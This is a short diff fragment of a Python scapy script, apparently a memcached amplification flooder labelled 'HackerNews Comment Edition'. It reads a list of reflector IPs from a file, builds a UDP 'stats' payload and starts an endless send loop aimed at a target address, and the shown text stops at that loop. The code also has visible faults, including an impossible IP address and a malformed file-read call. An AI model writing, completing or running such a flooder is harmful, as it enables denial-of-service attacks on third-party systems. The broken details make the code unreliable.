@@ -3,11 +3,10 @@
 # HackerNews Comment Edition:
 
 from scapy.all import IP, UDP, Raw, send
-
 target = '127.0.0.256'
 
-with open ('ips.txt', 'r') as f:
-        ips = f.readlines(r)
+f = open("ips.txt", "r")
+print(f.readline())
 
 payload = '\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
 while True:
